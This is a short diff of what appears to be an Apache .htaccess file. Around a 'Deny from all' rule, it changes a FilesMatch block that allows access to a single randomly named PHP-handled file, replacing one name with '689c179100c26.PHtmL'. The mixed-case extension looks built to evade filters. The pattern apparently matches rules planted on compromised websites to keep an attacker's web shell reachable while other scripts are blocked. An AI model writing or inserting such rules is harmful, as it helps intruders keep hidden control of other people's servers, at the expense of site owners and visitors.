@@ -5,7 +5,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(689ab588e0dd6.phtml)$">
+<FilesMatch "^(689c179100c26.PHtmL)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
